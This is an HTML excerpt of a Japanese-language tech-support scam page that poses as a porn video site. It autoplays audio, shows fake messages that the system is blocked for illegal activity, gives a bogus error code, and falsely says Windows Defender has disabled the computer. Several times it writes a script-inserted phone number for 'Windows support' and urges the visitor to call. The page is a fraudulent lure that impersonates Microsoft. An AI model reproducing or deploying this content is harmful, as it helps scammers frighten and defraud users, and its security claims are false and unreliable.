...
<head>
    ...
    <title>Free Porn Videos / HD Sex Videos</title>
...
<div class="innerContainer">
    ...
    <audio autoplay="" id="pridez">
      <source src="_au8d76.mp3" type="audio/mpeg">
    </audio>
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            ...
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> <script>document.write(ph0ne)</script>
              </span>
            </span>
          </div>
        </div>
    ...
    <div class="lightbox" id="poptxt" style="display: block;">
      ...
      <div id="txtintro">
        <span class="colo-rd">
          ...
          <div id="isp"> (エラーコード: #2V7HG8B)</div>
        </span>
      </div>
      <img src="re.gif" id="banner">
      <div id="disclaimer">違法行為のため、このシステムへのアクセスはブロックされています。  <br>
        <span class="support" style="font-size:22px;">Windows サポートに電話してください:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(ph0ne)</script>
          </span>
        </span>
      </div>
      <div id="bottom">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p>
        <b>違法行為のため、このシステムへのアクセスはブロックされています。</b>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 <br>
        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(ph0ne)</script>
          </span>
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> <script>document.write(ph0ne)</script>
        <br>(セキュリティサポート)
      </h4>
